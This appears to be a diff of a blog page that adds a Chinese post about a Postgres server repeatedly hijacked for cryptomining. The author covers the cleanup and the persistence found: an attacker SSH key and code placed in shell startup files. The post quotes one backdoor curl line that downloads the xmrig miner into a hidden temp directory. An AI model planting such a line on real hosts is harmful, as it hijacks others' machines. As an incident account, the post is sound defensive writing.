@@ -8,6 +8,8 @@
 	<!-- title -->
 	
 	<title>
+	
+		记一次服务器被挖矿的经历 | 
 	 
 	Yury&#39;s Blog
 	</title>
@@ -756,7 +758,7 @@ var _hmt = _hmt || [];
 							</ul>
 			
 							<ul>
-								<li class="file">
+								<li class="file active">
 									<a href="/linux/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%8C%96%E7%9F%BF%E7%9A%84%E7%BB%8F%E5%8E%86">
 										记一次服务器被挖矿的经历
 									</a>
@@ -836,46 +838,80 @@ var _hmt = _hmt || [];
 
 	<!-- 引入正文 -->
 	<div id="content">
-		<div id="index">
+		<h1 id="article-title">
+
+	记一次服务器被挖矿的经历
+</h1>
+<div class="article-meta">
 	
-		<div class="index-li">
-			<a href="/project/flink_data_warehouse/flink_data_warehouse">
-				<h2 class="index-title">
-					flink_data_warehouse
-				</h2>
-				<div class="index-brief">
-					前言Flink：1.12.0
-java：1.8
-一、实时数仓简介1、分层介绍
-ODS，数据采集层，采集原始数据、日志、业务数据等
-DWD，对ODS层的数据进行初步处理，并根据业务逻辑进行分流
-DIM，维度数据，存储一些元数据信息，放在hbase
-DWM，对于DWD数据对象进行进一步加工，常常是DWD
-					...
-				</div>
-			</a>
-                <div class="article-meta">
-				    <span>2021-10-30</span>
-                    
-                            
-                                
-                                    <span>
-                                        <i class="fa fa-folder" aria-hidden="true"></i>
-                                        <a href="/categories/bigdata/">bigdata</a>
-										
-                                    </span>
-                                
-                            
-                    
-                </div>
-		</div>	
-	
-	
-	<div id="index-paginator">
-		
-	</div>
+	<span>Yury</span>
+	<span>2022-03-18 19:39:18</span>
+		<div id="article-categories">
+    
+		<span>Categories：</span>
+            
+    
+
+    
+		<span>Tags：</span>
+            
+    
+		</div>
+
 </div>
 
+<div id="article-content">
+	<h1 id="记最近服务器被挖矿的经历"><a href="#记最近服务器被挖矿的经历" class="headerlink" title="记最近服务器被挖矿的经历"></a>记最近服务器被挖矿的经历</h1><p>最近服务器三次被挖矿了。</p>
+<h2 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h2><p>在服务器上安装了postgres数据库，为了方便，使用默认密码postgres，并在配置中设置<code>listen_addresses = *</code>方便远程房访问数据库，认为应该没人会来攻击我。结果没过几天，服务器就被植入了挖矿程序，阿里云报警。</p>
+<p>top再P查看CPU占用最高的进程，是一个以postgres用户运行的<code>.ddns</code>进程。</p>
+<p>前往<code>/proc/&#123;pid&#125;</code>查看挖矿进程运行的命令和可执行文件所在路径，定位到linux临时目录<code>var/tmp/</code>下。</p>
+<p><code>ll -a</code>查看所有文件，红框框内的都是挖矿程序使用的目录。果断全部删光光。然后<code>ps aux | grep postgres</code>将对应的可疑进程都kill掉。</p>
+<p>我本以为把进程全部kill掉，再把这些可执行文件删光就可以了，然后将密码改成自己常用的复杂密码就可以了，果然还是太年轻，于是就出现了第二次被挖矿的经历了。</p>
+<p><img src="/images/vartmp%E7%9B%AE%E5%BD%95.png"></p>
+<h2 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h2><p>第二次，没有任何预期，阿里云又报服务器被挖矿的消息。依然和上次一样把进程干掉，并挖矿程序删除掉。</p>
+<p>当时比较忙，没想太多，以为就是黑客把我密码爆破了，然后植入了挖矿程序。</p>
+<p>然后在avast上（<a target="_blank" rel="noopener" href="https://www.avast.com/zh-cn/random-password-generator%EF%BC%89%E6%8A%8A%E5%AF%86%E7%A0%81%E6%8D%A2%E6%88%90%E4%BA%86%E9%9A%8F%E6%9C%BA%E5%AF%86%E7%A0%81%E3%80%82">https://www.avast.com/zh-cn/random-password-generator）把密码换成了随机密码。</a></p>
+<h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p>第三次，当我用服务器用得正爽时，阿里云又通知我被入侵了，我一下子来兴趣了，我想看看这个人到底为什么能一直入侵我。</p>
+<p>经历上面两次入侵，我在想以下两个问题：</p>
+<p>1、为什么我改了postgres的密码，还能被入侵？思考：是不是某个地方泄露了我的密码？</p>
+<p>2、为什么这次被入侵的又是postgres用户？思考：如果黑客是以爆破密码的方式入侵我的服务器，那为什么不爆破root用户。</p>
+<p>3、这次入侵时，我刚好在用postgres用户导出数据，用postgres用户往本地传输了一份文件，难道是我以postgres登录时泄露了密码？</p>
+<p><img src="/images/%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E6%88%AA%E5%9B%BE.jpg"></p>
+<p>基于以上两点，我很怀疑我的postgres用户的密码泄露了，但是我还是linux小白，于是只能在google上寻找答案。</p>
+<p>找了很久，翻了一些被人被入侵的博文，原因大致就是，被入侵后，黑客在服务器上留了一些后门：</p>
+<p><strong><font color="Red">重点：</font></strong></p>
+<p>1、黑客在postgres用户目录下保存了ssh公钥（**.ssh/authorized_keys**），这样他无需输入密码就可以远程登录。我这里就发现postgres用户下就有他的公钥，删除即可。</p>
+<p>2、黑客在postgres用户目录下的<code>.bash_profile</code>、<code>.bash_login</code>、<code>.profile</code>、<code>.bashrc</code>、<code>.bash_logout</code>文件中添加了他自己的后门脚本代码。这样，在你登录或者退出登录时，都会执行他自己的后门脚本代码。于是我在我的服务器中发现了他的后门代码，原始代码已经找不到了（服务器到期了。。。），大致有一段如下：</p>
+<pre><code class="shell">/bin/curl -fsSL -o /var/tmp/.crypto/.../xmr/ https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz  
+</code></pre>
+<p>这就能解释为什么我一用postgres用户登陆服务器后，就会被入侵了。</p>
+<h2 id="黑客信息"><a href="#黑客信息" class="headerlink" title="黑客信息"></a>黑客信息</h2><p>此外我在黑客植入的<code>.crypto</code>目录下发现了一些黑客挖矿的日志文件，里面记载了一些ip啥的，通过一些IP查询的网站，能确定两个地区的ip，一个是欧洲一个国家，忘记名字了，另一个是美国。</p>
+<p>由于服务器时间刚好到期，最近也比较忙，很多东西还没来得及发掘，服务器就没了，可惜。</p>
+
+</div>
+
+
+    <div class="post-guide">
+        <div class="item left">
+            
+        </div>
+        <div class="item right">
+            
+              <a href="/java/java%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE">
+                java常用配置
+                <i class="fa fa-angle-right" aria-hidden="true"></i>
+              </a>
+            
+        </div>
+    </div>
+
+
+
+
+<script>
+	
+	
+</script>
 	</div>
 	<div id="footer">
 	<p>
